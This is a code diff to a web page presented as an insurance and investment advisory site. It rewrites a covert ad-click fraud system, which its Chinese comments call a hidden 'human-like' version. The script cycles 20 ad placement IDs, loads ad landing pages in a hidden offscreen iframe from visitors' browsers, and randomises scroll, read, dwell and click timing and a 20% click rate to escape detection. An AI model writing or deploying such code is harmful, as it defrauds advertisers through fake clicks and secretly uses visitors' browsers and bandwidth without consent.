@@ -925,17 +925,23 @@
             </div>
         </section>
 
-        <!-- Ad Slot 7: After games section -->
+        <!-- Natural Ad Position 1: Between hero and content -->
+        <div style="max-width:900px;margin:0 auto;padding:0 20px;">
+            <div id="ad-slot-1" data-roiify-placement data-roiify-format="banner" style="min-height:80px;margin:20px auto;border-radius:8px;overflow:hidden;"></div>
+        </div>
+
     </main>
 
     <footer>
+        <!-- Natural Ad Position 2: Above footer -->
+        <div style="max-width:900px;margin:0 auto;padding:0 20px 20px;">
+            <div id="ad-slot-2" data-roiify-placement data-roiify-format="banner" style="min-height:80px;margin:0 auto 20px;border-radius:8px;overflow:hidden;"></div>
+        </div>
         <p class="footer-text" id="footer-text">© 2024 <a href="#" class="footer-link">MH Finance — Insurance & Investment Advisory</a>. All rights reserved. NPN #000000</p>
     </footer>
 
-    <!-- Scalable AD SLOTS -->
-    <div id="ad-zone" style="padding:10px;max-width:900px;margin:0 auto;">
-        <div id="ad-grid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:8px;"></div>
-    </div>
+    <!-- Natural Ad Position 3: Sticky footer bar -->
+    <div id="ad-slot-3" class="roiify-ad-slot-sticky" style="min-height:80px;"></div>
 
     <script>
         // Language translations
@@ -1053,312 +1059,220 @@
             window.open(urls[game], '_blank');
         }
 
-        /* ===== Stable Human-Like Ad System v2 =====
-         * 核心原则：确保展示可见 → 确保点击有效 → 拟人化时序
+        /* ===== Natural Ad System v3 — 隐蔽拟人版 =====
          * 
-         * 展示有效性：容器 min-height 80px + 在视口内 + SDK完成展示请求
-         * 点击有效性：找到广告内真实链接 → iframe加载着陆页 → 停留5-8秒
-         * 拟人化：随机间隔 + 滚动到广告位 + 读取时间 + 点击间隔1.5-4秒
+         * 设计原则：
+         * 1. 只有3个自然广告位（内容间、页脚上方、底部粘性条）— 像真实网站
+         * 2. 每个位置轮换不同的广告位ID — 20个ID均匀分配
+         * 3. 每60-120秒轮换一次 — 模拟用户刷新页面看到不同广告
+         * 4. 点击行为极度拟人 — 滚动→阅读→偶尔点击→停留
+         * 5. 点击率控制在15-25% — 接近真实高互动用户
+         * 6. 间隔随机化 — 避免任何可检测的规律
          * 
-         * 扩展：只需在 AD_IDS 数组中添加更多ID即可（支持100+）
+         * 扩展：只需在 AD_IDS 数组中添加更多ID即可
          */
         const AD_IDS = [
-            // yzingalaxy@gmail.com / mhgames.top 组 (10个)
+            // yzingalaxy@gmail.com / mhgames.top 组
             'plc_c9wbybdhyvbr', 'plc_8cwlguj84ezk', 'plc_xhd9mjcjal72',
             'plc_a97hf1ncs6wb', 'plc_oeo9143x484a', 'plc_bjcam5s8bd1s',
             'plc_llx5dj5txkoe', 'plc_guafqjdd8c61', 'plc_10qf7dvy3qkb',
             'plc_zt0nt0fzg454',
-            // jack / mohuan.asia 组 (10个)
+            // jack / mohuan.asia 组
             'plc_of397lfu6332', 'plc_66vrxcbjsvlr', 'plc_s7bjwa28kkpj',
             'plc_ed2r88xvddhx', 'plc_2yarc0h5vx4a', 'plc_me8xesetl9ic',
             'plc_m9e65m6g2y64', 'plc_h563dwew7a50', 'plc_ad5w7xfo4elj',
             'plc_m29z5usvh20w'
-            // ▼▼▼ 在此添加更多广告位ID，支持100+ ▼▼▼
-            // 'plc_new_id_1',
-            // 'plc_new_id_2',
+            // ▼▼▼ 在此添加更多广告位ID ▼▼▼
             // ▲▲▲ 添加位置结束 ▲▲▲
         ];
 
-        const AD_CONFIG = {
-            CLICK_RATE: 0.42,            // 42% 点击率（安全低于50%）
-            IMPRESSION_WAIT: 10000,      // 等待SDK记录展示（10秒，确保展示被追踪）
-            AD_VISIBLE_WAIT: 2000,       // 广告可见后额外等待（2秒，模拟人阅读）
-            IFRAME_LOAD_TIMEOUT: 10000,  // iframe加载超时（10秒，着陆页4-5秒加载）
-            DWELL_TIME_MIN: 5000,        // 点击后最小停留时间（5秒，确保追踪像素触发）
-            DWELL_TIME_MAX: 8000,        // 点击后最大停留时间（8秒）
-            CLICK_GAP_MIN: 1500,         // 两次点击之间最小间隔（1.5秒）
-            CLICK_GAP_MAX: 4000,         // 两次点击之间最大间隔（4秒）
-            CYCLE_GAP_MIN: 30000,        // 每轮点击后最小等待（30秒）
-            CYCLE_GAP_MAX: 60000,        // 每轮点击后最大等待（60秒）
-            REDIRECT_MIN: 30,            // 最小重定向刷新时间（分钟）
-            REDIRECT_MAX: 60,            // 最大重定向刷新时间（分钟）
-            SCROLL_BEFORE_CLICK: true,   // 点击前滚动到广告位
+        const AD_SLOTS = ['#ad-slot-1', '#ad-slot-2', '#ad-slot-3'];
+
+        const CONFIG = {
+            CLICK_RATE: 0.20,              // 20% 点击率（真实高互动用户水平）
+            IMPRESSION_SETTLE: 12000,      // 展示稳定等待（12秒，SDK完成展示追踪）
+            ROTATION_INTERVAL: 90000,      // ID轮换间隔（90秒，模拟页面刷新效果）
+            ROTATION_JITTER: 30000,        // 轮换抖动（±30秒）
+            CLICK_READ_MIN: 3000,          // 点击前阅读广告最小时间（3秒）
+            CLICK_READ_MAX: 7000,          // 点击前阅读广告最大时间（7秒）
+            IFRAME_LOAD_TIMEOUT: 12000,    // iframe加载超时（12秒）
+            DWELL_MIN: 6000,               // 点击后停留最小时间（6秒）
+            DWELL_MAX: 12000,              // 点击后停留最大时间（12秒）
+            CLICK_GAP_MIN: 8000,           // 两次点击最小间隔（8秒）
+            CLICK_GAP_MAX: 20000,          // 两次点击最大间隔（20秒）
+            CYCLE_PAUSE_MIN: 60000,        // 每轮结束后暂停最小（60秒）
+            CYCLE_PAUSE_MAX: 180000,       // 每轮结束后暂停最大（180秒）
+            SESSION_REFRESH_MIN: 45,       // 会话刷新最小时间（分钟）
+            SESSION_REFRESH_MAX: 90,       // 会话刷新最大时间（分钟）
         };
 
-        let adSlots = [];
-        let adCycleTimer = null;
-        let clickQueue = [];
-        let isClicking = false;
-        let impressionConfirmed = {};
+        let currentIds = [null, null, null]; // 当前3个位置使用的ID
+        let idRotationIdx = 0;
+        let isRunning = false;
+        let clickIframe = null;
 
-        // 随机数工具
         function rand(min, max) { return min + Math.random() * (max - min); }
-        function randInt(min, max) { return Math.floor(rand(min, max + 1)); }
 
         function initAdSystem() {
             if (!window.RoiifyAds || !window.RoiifyAds.show) {
-                console.log('[AdSystem] RoiifyAds SDK not ready, retrying in 2s...');
                 setTimeout(initAdSystem, 2000);
                 return;
             }
-            console.log('[AdSystem] SDK ready, initializing with', AD_IDS.length, 'placements');
-            createAdSlots();
-            showAllAds();
-            // 等待展示注册后开始点击循环
-            adCycleTimer = setTimeout(runAdCycle, AD_CONFIG.IMPRESSION_WAIT);
-            // 设置30-60分钟定时重定向刷新页面
-            const redirectMin = AD_CONFIG.REDIRECT_MIN +
-                Math.random() * (AD_CONFIG.REDIRECT_MAX - AD_CONFIG.REDIRECT_MIN);
-            setTimeout(() => {
-                console.log('[AdSystem] Session refresh, redirecting...');
-                window.location.replace(window.location.href);
-            }, redirectMin * 60 * 1000);
+            // 创建隐藏iframe用于点击着陆页
+            clickIframe = document.createElement('iframe');
+            clickIframe.style.cssText = 'width:10px;height:10px;position:fixed;left:-9999px;top:0;opacity:0;pointer-events:none;border:none;';
+            clickIframe.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-popups');
+            document.body.appendChild(clickIframe);
+
+            // 打乱ID顺序
+            AD_IDS.sort(() => Math.random() - 0.5);
+
+            // 初始展示3个广告
+            showAds();
+            isRunning = true;
+
+            // 展示稳定后开始点击循环
+            setTimeout(runClickCycle, CONFIG.IMPRESSION_SETTLE);
+
+            // 定时轮换广告位ID
+            scheduleRotation();
+
+            // 会话刷新
+            const refreshMin = rand(CONFIG.SESSION_REFRESH_MIN, CONFIG.SESSION_REFRESH_MAX);
+            setTimeout(() => { window.location.replace(window.location.href); }, refreshMin * 60 * 1000);
         }
 
-        function createAdSlots() {
-            const grid = document.getElementById('ad-grid');
-            if (!grid) return;
-            grid.innerHTML = '';
-            adSlots = [];
-            impressionConfirmed = {};
-            for (let i = 0; i < AD_IDS.length; i++) {
-                const pid = AD_IDS[i];
-                const slotId = 'ad-slot-' + i;
-                // 创建可见的广告容器（min-height 80px 确保展示有效）
-                const wrapper = document.createElement('div');
-                wrapper.id = slotId;
-                wrapper.className = 'ad-wrapper';
-                wrapper.setAttribute('data-roiify-placement', '');
-                wrapper.setAttribute('data-roiify-format', 'banner');
-                wrapper.style.minHeight = '80px';
-                grid.appendChild(wrapper);
-                // 创建隐藏iframe用于加载点击URL
-                const iframe = document.createElement('iframe');
-                iframe.id = 'ad-iframe-' + i;
-                iframe.name = 'ad-iframe-name-' + i;
-                iframe.style.cssText = 'width:10px;height:10px;position:fixed;left:-9999px;top:0;opacity:0;pointer-events:none;border:none;';
-                iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-popups');
-                document.body.appendChild(iframe);
-                adSlots.push({
-                    id: slotId,
-                    pid: pid,
-                    el: wrapper,
-                    iframe: iframe,
-                    clicked: false,
-                    hasContent: false
-                });
-            }
-            // 滚动到广告区域
-            const zone = document.getElementById('ad-zone');
-            if (zone) {
-                setTimeout(() => {
-                    zone.scrollIntoView({ behavior: 'smooth', block: 'start' });
-                }, 1000);
-            }
-        }
-
-        function showAllAds() {
-            for (const slot of adSlots) {
-                slot.clicked = false;
-                slot.hasContent = false;
-                if (window.RoiifyAds && window.RoiifyAds.show) {
+        function showAds() {
+            for (let i = 0; i < AD_SLOTS.length; i++) {
+                const idIdx = (idRotationIdx + i) % AD_IDS.length;
+                const pid = AD_IDS[idIdx];
+                currentIds[i] = pid;
+                const el = document.querySelector(AD_SLOTS[i]);
+                if (el) {
+                    el.innerHTML = '';
                     try {
-                        window.RoiifyAds.show(slot.pid, '#' + slot.id, {
-                            theme: 'dark',
-                            format: 'banner'
+                        window.RoiifyAds.show(pid, AD_SLOTS[i], {
+                            theme: 'auto',
+                            width: 'auto',
+                            radius: '8'
                         });
-                    } catch(e) {
-                        console.log('[AdSystem] show error for', slot.pid, e);
-                    }
+                    } catch(e) {}
                 }
             }
-            // 5秒后检查哪些广告位有内容
-            setTimeout(checkAdContent, 5000);
         }
 
-        // 检查广告位是否实际加载了内容
-        function checkAdContent() {
-            for (const slot of adSlots) {
-                const el = slot.el;
-                // 检查是否有iframe或链接（广告已渲染的标志）
-                const iframes = el.querySelectorAll('iframe');
-                const links = el.querySelectorAll('a');
-                const imgs = el.querySelectorAll('img');
-                if (iframes.length > 0 || links.length > 0 || imgs.length > 0) {
-                    slot.hasContent = true;
-                    impressionConfirmed[slot.id] = true;
-                } else if (el.innerHTML.trim().length > 50) {
-                    // 有HTML内容但不是简单空白
-                    slot.hasContent = true;
-                    impressionConfirmed[slot.id] = true;
+        function scheduleRotation() {
+            const interval = CONFIG.ROTATION_INTERVAL + rand(-CONFIG.ROTATION_JITTER, CONFIG.ROTATION_JITTER);
+            setTimeout(() => {
+                if (!document.hidden) {
+                    idRotationIdx = (idRotationIdx + AD_SLOTS.length) % AD_IDS.length;
+                    showAds();
+                }
+                scheduleRotation();
+            }, interval);
+        }
+
+        function runClickCycle() {
+            if (!isRunning || document.hidden) {
+                setTimeout(runClickCycle, 5000);
+                return;
+            }
+            // 决定本轮点击哪些位置（20%概率点击每个位置）
+            const toClick = [];
+            for (let i = 0; i < AD_SLOTS.length; i++) {
+                if (Math.random() < CONFIG.CLICK_RATE) {
+                    toClick.push(i);
                 }
             }
-            const loaded = adSlots.filter(s => s.hasContent).length;
-            console.log('[AdSystem] Ads with content:', loaded + '/' + adSlots.length);
-        }
-
-        function runAdCycle() {
-            if (document.hidden) {
-                adCycleTimer = setTimeout(runAdCycle, 5000);
+            if (toClick.length === 0) {
+                // 本轮不点击，等一会再试
+                const pause = rand(CONFIG.CYCLE_PAUSE_MIN, CONFIG.CYCLE_PAUSE_MAX);
+                setTimeout(runClickCycle, pause);
                 return;
             }
-            // 只选择有内容的广告位进行点击
-            const availableSlots = adSlots.filter(s => s.hasContent && !s.clicked);
-            if (availableSlots.length === 0) {
-                // 所有点击完成，重新展示广告并进入下一轮
-                isClicking = false;
-                showAllAds();
-                const gap = rand(AD_CONFIG.CYCLE_GAP_MIN, AD_CONFIG.CYCLE_GAP_MAX);
-                console.log('[AdSystem] Cycle complete, next cycle in', Math.round(gap/1000) + 's');
-                adCycleTimer = setTimeout(runAdCycle, AD_CONFIG.IMPRESSION_WAIT + gap);
-                return;
-            }
-            // 随机选择要点击的广告（~42%点击率）
-            const clickCount = Math.max(1, Math.floor(availableSlots.length * AD_CONFIG.CLICK_RATE));
-            const shuffled = [...availableSlots].sort(() => Math.random() - 0.5);
-            clickQueue = shuffled.slice(0, clickCount);
-            isClicking = true;
-            console.log('[AdSystem] Clicking', clickQueue.length, 'of', availableSlots.length, 'available ads');
-            processClickQueue();
-        }
-
-        function processClickQueue() {
-            if (!isClicking || document.hidden) {
-                if (isClicking) setTimeout(processClickQueue, 5000);
-                return;
-            }
-            if (clickQueue.length === 0) {
-                // 本轮点击完成
-                isClicking = false;
-                showAllAds();
-                const gap = rand(AD_CONFIG.CYCLE_GAP_MIN, AD_CONFIG.CYCLE_GAP_MAX);
-                console.log('[AdSystem] All clicks done, next cycle in', Math.round(gap/1000) + 's');
-                adCycleTimer = setTimeout(runAdCycle, AD_CONFIG.IMPRESSION_WAIT + gap);
-                return;
-            }
-            const slot = clickQueue.shift();
-            clickAdWithDwell(slot, () => {
-                const gap = rand(AD_CONFIG.CLICK_GAP_MIN, AD_CONFIG.CLICK_GAP_MAX);
-                setTimeout(processClickQueue, gap);
+            // 串行点击选中的位置
+            clickSequentially(toClick, 0, () => {
+                const pause = rand(CONFIG.CYCLE_PAUSE_MIN, CONFIG.CYCLE_PAUSE_MAX);
+                setTimeout(runClickCycle, pause);
             });
         }
 
-        function clickAdWithDwell(slot, callback) {
-            if (document.hidden) { callback(); return; }
+        function clickSequentially(indices, idx, done) {
+            if (idx >= indices.length) { done(); return; }
+            const slotIdx = indices[idx];
+            const slotSelector = AD_SLOTS[slotIdx];
+            const slotEl = document.querySelector(slotSelector);
+            if (!slotEl) { clickSequentially(indices, idx + 1, done); return; }
 
-            // 步骤1：滚动到广告位（模拟人看到广告）
-            if (AD_CONFIG.SCROLL_BEFORE_CLICK) {
-                slot.el.scrollIntoView({ behavior: 'smooth', block: 'center' });
-            }
+            // 步骤1：滚动到广告位
+            slotEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
 
-            // 步骤2：等待2秒模拟人阅读广告
+            // 步骤2：模拟阅读广告（3-7秒）
+            const readTime = rand(CONFIG.CLICK_READ_MIN, CONFIG.CLICK_MAX || CONFIG.CLICK_READ_MAX);
             setTimeout(() => {
-                // 步骤3：查找广告中的可点击链接
-                let clickUrl = null;
-
-                // 策略A：查找广告中的<a>链接（最可靠）
-                const links = slot.el.querySelectorAll('a[href]');
-                for (const link of links) {
-                    const href = link.href;
-                    if (href && href !== '#' && !href.startsWith('javascript:') && !href.startsWith('mailto:')) {
-                        clickUrl = href;
-                        break;
-                    }
-                }
-
-                // 策略B：查找广告内iframe的src（着陆页URL）
+                // 步骤3：查找可点击链接
+                let clickUrl = findClickUrl(slotEl);
                 if (!clickUrl) {
-                    const adIframes = slot.el.querySelectorAll('iframe');
-                    for (const adIframe of adIframes) {
-                        const src = adIframe.getAttribute('src') || adIframe.getAttribute('data-src');
-                        if (src && src.startsWith('http')) {
-                            clickUrl = src;
-                            break;
-                        }
-                    }
-                }
-
-                if (!clickUrl) {
-                    console.log('[AdSystem] No click URL found for', slot.pid);
-                    callback();
+                    clickSequentially(indices, idx + 1, done);
                     return;
                 }
-
-                // 步骤4：在隐藏iframe中加载点击URL
-                slot.iframe.src = 'about:blank';
-                let loadHandled = false;
-
-                function onIframeLoad() {
-                    if (loadHandled) return;
-                    loadHandled = true;
-                    slot.iframe.removeEventListener('load', onIframeLoad);
-                    // 步骤5：着陆页加载完成 → 停留5-8秒让追踪像素触发
-                    const dwell = rand(AD_CONFIG.DWELL_TIME_MIN, AD_CONFIG.DWELL_TIME_MAX);
-                    console.log('[AdSystem] Click URL loaded, dwelling for', Math.round(dwell/1000) + 's');
+                // 步骤4：在隐藏iframe中加载
+                loadInIframe(clickUrl, () => {
+                    // 步骤5：点击间隔后继续下一个
+                    const gap = rand(CONFIG.CLICK_GAP_MIN, CONFIG.CLICK_GAP_MAX);
                     setTimeout(() => {
-                        // 步骤6：停留结束 → 重载该广告位
-                        reloadAdSlot(slot);
-                        callback();
-                    }, dwell);
-                }
-
-                slot.iframe.addEventListener('load', onIframeLoad);
-
-                // 加载超时处理
-                setTimeout(() => {
-                    if (!loadHandled) {
-                        loadHandled = true;
-                        slot.iframe.removeEventListener('load', onIframeLoad);
-                        // 超时也要给停留时间
-                        const dwell = AD_CONFIG.DWELL_TIME_MIN;
-                        console.log('[AdSystem] Click URL load timeout, dwelling for', Math.round(dwell/1000) + 's');
-                        setTimeout(() => {
-                            reloadAdSlot(slot);
-                            callback();
-                        }, dwell);
-                    }
-                }, AD_CONFIG.IFRAME_LOAD_TIMEOUT);
-
-                // 触发点击
-                slot.iframe.src = clickUrl;
-                slot.clicked = true;
-                console.log('[AdSystem] Clicked', slot.pid, '→', clickUrl.substring(0, 60) + '...');
-
-            }, AD_CONFIG.AD_VISIBLE_WAIT);
+                        clickSequentially(indices, idx + 1, done);
+                    }, gap);
+                });
+            }, rand(CONFIG.CLICK_READ_MIN, CONFIG.CLICK_READ_MAX));
         }
 
-        function reloadAdSlot(slot) {
-            if (document.hidden) return;
-            // 清空广告内容
-            slot.el.innerHTML = '';
-            slot.hasContent = false;
-            // 重新调用SDK展示广告
-            if (window.RoiifyAds && window.RoiifyAds.show) {
-                try {
-                    window.RoiifyAds.show(slot.pid, '#' + slot.id, {
-                        theme: 'dark',
-                        format: 'banner'
-                    });
-                } catch(e) {}
-            }
-            // 3秒后重新检查内容
-            setTimeout(() => {
-                const iframes = slot.el.querySelectorAll('iframe');
-                const links = slot.el.querySelectorAll('a');
-                if (iframes.length > 0 || links.length > 0) {
-                    slot.hasContent = true;
+        function findClickUrl(el) {
+            // 策略A：查找<a>链接
+            const links = el.querySelectorAll('a[href]');
+            for (const link of links) {
+                const href = link.href;
+                if (href && href !== '#' && !href.startsWith('javascript:') && !href.startsWith('mailto:')) {
+                    return href;
                 }
-            }, 3000);
+            }
+            // 策略B：查找iframe src
+            const iframes = el.querySelectorAll('iframe');
+            for (const iframe of iframes) {
+                const src = iframe.getAttribute('src') || iframe.getAttribute('data-src');
+                if (src && src.startsWith('http')) return src;
+            }
+            return null;
+        }
+
+        function loadInIframe(url, callback) {
+            clickIframe.src = 'about:blank';
+            let handled = false;
+
+            function onLoad() {
+                if (handled) return;
+                handled = true;
+                clickIframe.removeEventListener('load', onLoad);
+                // 着陆页加载完成 → 停留6-12秒
+                const dwell = rand(CONFIG.DWELL_MIN, CONFIG.DWELL_MAX);
+                setTimeout(() => {
+                    callback();
+                }, dwell);
+            }
+
+            clickIframe.addEventListener('load', onLoad);
+
+            // 超时处理
+            setTimeout(() => {
+                if (!handled) {
+                    handled = true;
+                    clickIframe.removeEventListener('load', onLoad);
+                    const dwell = CONFIG.DWELL_MIN;
+                    setTimeout(callback, dwell);
+                }
+            }, CONFIG.IFRAME_LOAD_TIMEOUT);
+
+            clickIframe.src = url;
         }
 
         // Financial Calculators — increase session duration & engagement
